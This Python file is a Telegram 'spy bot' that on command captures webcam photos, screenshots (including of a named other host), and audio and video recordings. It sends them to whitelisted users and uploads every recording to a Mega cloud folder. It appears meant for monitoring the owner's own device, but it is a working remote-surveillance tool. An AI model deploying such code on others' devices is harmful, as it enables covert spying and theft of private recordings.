from utils import * 
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging, shutil,datetime
from mega import Mega 

from time import sleep


TOKEN = os.getenv('TOKEN')
ALLOWED_USERS = [int(i) for i in os.getenv('ALLOWED_USERS').split()]  
ADMIN = os.getenv('ADMIN')



bot = TeleBot(TOKEN, parse_mode='HTML')



# remind the user when a long recording in progress
class Reminder:
    def __init__(self, timeOut=3 * 60):
        self.timeOut = timeOut  # interval to notify the user, 10 minute default
        self.timer: Timer
        self.userid: int = 0

    def remind(self, userid: int):
        self.userid = userid
        self.timer = RepeatTimer(self.timeOut, self.nudge)
        self.timer.start()

    def nudge(self):
        message = bot.send_message(self.userid, "Recording in progress. Don't forget to finish")
        deleteMessage(message,60) # delete this notification after 10 seconds

    def cancel(self):
        self.timer.cancel()


recorder = AVRecorder()
remind = Reminder()




def myPic():
    if datetime.time(9,0,0) <= datetime.datetime.now().time() <= datetime.time(21,0,0): 
        recorder.takePicture()
# take a picture every 30 minutes 
# myTimer = RepeatTimer(3*60,myPic)
# myTimer.start()






def deleteMessage(message, delay=0):
    # delete a message, optionally define a delay for the delete
    def tempDelete(message):
        bot.delete_message(message.chat.id, message.message_id)
    if delay: # dely non zero means delete some times later
        Timer(delay,tempDelete,[message]).start()
    else:
        tempDelete(message)


def make_logger():
    #Create the logger
    logger = logging.getLogger('Tel')
    logger.setLevel(logging.INFO)
    fh = logging.FileHandler("tel.log")
    fh.setLevel(logging.INFO)
    fh.setFormatter(logging.Formatter("[%(asctime)s] - %(message)s","%d-%m-%Y %I:%M:%S %p"))
    logger.addHandler(fh)
    return logger


logger = make_logger()


def checkRequest(message):
    # check if the request is from a valid user, if not send a notification to admin
    user = message.from_user

    if user.id not in ALLOWED_USERS:
        bot.send_message(user.id, "You are not authorized to use this bot")
        bot.send_message(ADMIN,f'Incoming request from unregistered user {user.first_name} {user.last_name} ({user.id})')
        logger.info(f'***Incoming request from unregistered user {user.first_name} {user.last_name} ({user.id})')
        return True
    logger.info(f"User: {user.first_name} {user.last_name} ({user.id}); Command: {message.text}")
    return False



@bot.message_handler(commands=['start'])
def send_welcome(message):
    if checkRequest(message):
        return
    bot.send_message(message.from_user.id, "Welcome to the spy bot")


@bot.message_handler(commands=['screen'])
def send_screen_other(message):
    hostOther = message.text.replace('/screen', '')
    user = message.from_user.id
    if checkRequest(message):
        return


    waitM = bot.send_message(user, "Wait while the bot takes the photo")
    file = takeScreenShot(hostOther)

    if not file:
        bot.send_message(user, "Device is busy. Can't capture photo.")
        bot.delete_message(waitM.chat.id, waitM.message_id)
        return


    ranStr = getRandomString()

    with open(file, 'rb') as f:
        try:
            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
                reply_markup=photoMarkup(ranStr))
        except Exception as e:
            logger.info(e)

    photoK.queueToDelete(message, photoM, ranStr)
    bot.delete_message(waitM.chat.id, waitM.message_id)


#@bot.message_handler(commands=['screen'])
#def send_screen(message):
    #user = message.from_user.id
    #if checkRequest(message):
#        #return


#    waitM = bot.send_message(user, "Wait while the bot takes the photo")
#    file = takeScreenShot()
#    if not file:
#        bot.send_message(user, "Device is busy. Can't capture photo.")
#        bot.delete_message(waitM.chat.id, waitM.message_id)
#        return
#
#
#    ranStr = getRandomString()
#
#    with open(file, 'rb') as f:
#        try:
#            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
#                reply_markup=photoMarkup(ranStr))
#        except Exception as e:
#            logger.info(e)
#    
#    photoK.queueToDelete(message, photoM, ranStr)
#    bot.delete_message(waitM.chat.id, waitM.message_id)
#


@bot.message_handler(commands=['photo'])
def send_photo(message):
    user = message.from_user.id 
    
    if checkRequest(message): return


    waitM = bot.send_message(user, 
            "Wait while the bot takes the photo"+("\nNote: Recording in progress" if recorder.isRunning else ''))
    
    file = recorder.takePhoto()
    if not file:
        bot.send_message(user, "Device is busy. Can't capture photo.")
        bot.delete_message(waitM.chat.id, waitM.message_id)
        return


    ranStr = getRandomString()

    with open(file, 'rb') as f:
        try:
            photoM = bot.send_photo(user, f, caption="This photo will be deleted after 10 seconds.", 
                reply_markup=photoMarkup(ranStr))
        except Exception as e:
            logger.info(e)
    
    photoK.queueToDelete(message, photoM, ranStr)
    bot.delete_message(waitM.chat.id, waitM.message_id)


def photoMarkup(ranStr:str):
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(InlineKeyboardButton("Keep this photo", callback_data="cb_keep_photo"+ranStr))
    return markup



class PhotoKeeper():
    def __init__(self):
        self.delay = 10  # 5
        self.store = {}
    # store the timer and message with a random string 
    # to uniquely identify the callback source

    def tmpDelete(self,*messages):
        for i in messages:
            bot.delete_message(i.chat.id, i.message_id)

    def queueToDelete(self, commandM, photoM, ranStr):
        timer = Timer(self.delay, self.tmpDelete,[commandM, photoM])
        self.store[ranStr] = {
            'timer': timer,
            'photoM':photoM
        }
        timer.start()
        
    def keepPhoto(self,ranStr):
        self.store[ranStr]['timer'].cancel()
        photoM = self.store[ranStr]['photoM']
        bot.edit_message_caption("",photoM.chat.id, photoM.message_id,reply_markup=None)


photoK = PhotoKeeper()


# @bot.message_handler(commands=['audio'])
# def send_audio(message):
#     # start audio recording
#     user = message.from_user.id
#     if checkRequest(message):
#         return

#     if recorder.isRunning:
#         bot.send_message(user, "Recording already in progress.")
#     else:
#         ret = recorder.startAudeoRec()
#         if ret:
#             bot.send_message(user, "Device is busy. Can't record.")
#         else:
#             bot.send_message(user, "Recording in progress.", reply_markup=mediaMarkup())
#             remind.remind(user)



@bot.message_handler(commands=['video','audio'])
def send_video(message):
    user = message.from_user.id
    if checkRequest(message):
        return

    if recorder.isRunning:
        bot.send_message(user, "Recording already in progress.")
    else:
        ret = recorder.startVideoRec() if message.text =='/video' else recorder.startAudeoRec()
        if ret:
            bot.send_message(user, "Device is busy. Can't record.")
        else:
            bot.send_message(user, "Recording in progress.", reply_markup=mediaMarkup())
            remind.remind(user)


def mediaMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_recording"),
               InlineKeyboardButton("Cancel", callback_data="cb_cancel_recording"))
    return markup




@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):


    if call.data[:13]=="cb_keep_photo":
        photoK.keepPhoto(call.data[-10:])
        return

    deleteMessage(call.message)
    remind.cancel()  # clear all reminder
    user = call.from_user.id

    if not recorder.isRunning:
        bot.send_message(user, "No recording is currently in progress !!!")
        return

    if call.data == "cb_stop_recording":
        file, act = recorder.close()
        size = os.path.getsize(file)/1e6

        logger.info(f"Recording finished: {os.path.basename(file)} ({act:.2f} sec) ({size:.2f} MB)")
        msg = bot.send_message(user, "Recording saved successfully. Wait while the bot uploads the file.")

        uploaded = False

        try: # telegram server won't accept file larger than 50 mb
            if size>49:
                raise Exception('File too large to upload')
            with open(file,'rb') as ff:
                if file.endswith('mp4'):
                    bot.send_video(user, ff)
                else:
                    bot.send_audio(user, ff)
        except:
            mm = bot.send_message(user, f"Something went wrong while uploading the file to telegram server."
                "The bot will upload the file to a remote server")
            link = mClient.get_upload_link(mClient.upload(file, MEGA_FOLDER))
            deleteMessage(mm)
            bot.send_message(user,link)
            uploaded = True
        finally:
            if not uploaded: # upload it anyway for future storage
                mClient.upload(file, MEGA_FOLDER)

        deleteMessage(msg)


    elif call.data == "cb_cancel_recording":
        file,_= recorder.close()
        os.remove(file)
        bot.send_message(user, "Recording terminated")
        logger.info('Recording terminated')


sleep(5)
#^ when run with crontab, with pipenv and proxy setting
# somehow the bot is unable to use the proxy at the start, 
# a delay to initiate the bot seems to fix the things here.

bot.send_message(ADMIN, "Starting bot")
mega = Mega()
user,pasw,MEGA_FOLDER = os.getenv('MEGA').split(',')
mClient = mega.login(user,pasw)
bot.infinity_polling()
